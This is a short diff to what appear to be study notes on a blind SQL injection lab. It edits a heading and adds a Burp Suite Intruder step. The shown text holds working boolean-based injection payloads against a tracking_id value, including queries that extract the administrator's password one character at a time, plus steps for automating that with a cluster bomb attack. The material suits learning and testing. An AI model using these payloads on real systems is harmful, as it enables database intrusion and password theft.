@@ -26,7 +26,7 @@ and 1=0--'
 
 -> FALSE -> No Welcome back 
 
-(2) Confirm That we have a users tracking_table
+(2) Confirm That we have a users ,tracking_table
 
 select tracking_id from tracking_table where tracking_id='mkUsurYBHimnK3RK' 
 and (select 'x' from users LIMIT 1)='x'--'
@@ -63,6 +63,7 @@ and same goes for second character
 select tracking_id from tracking_table where tracking_id='mkUsurYBHimnK3RK' 
 and (select substring(password,1,1) from users where username='administrator')='a'--'
 
+Burpsuite Intruder :
 1> send the request to intruder 
 2> attack type cluster bomb
 3> clear all payload markers
